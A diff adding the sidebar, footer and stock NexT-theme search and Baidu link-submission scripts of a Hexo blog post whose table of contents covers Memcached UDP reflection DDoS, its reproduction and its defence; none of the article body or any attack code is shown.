+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">77</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/emptyxl" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="/mail/index.html" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Memcached-简介"><span class="nav-number">1.</span> <span class="nav-text">Memcached 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP-Reflection-DDoS"><span class="nav-number">2.</span> <span class="nav-text">UDP Reflection DDoS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#复现"><span class="nav-number">2.1.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">3.</span> <span class="nav-text">防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    
+    &emsp;&emsp;|&emsp;
+  </span>
+  <span class="author" itemprop="copyrightHolder">empty_xl</span>
+</div>
+
+
+<div class="powered-by">
+  
+  Power &mdash; Hexo
+</div>
+
+<div class="theme-info">
+  
+  Theme &mdash; NexT.Mist
+</div>
+<div>
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
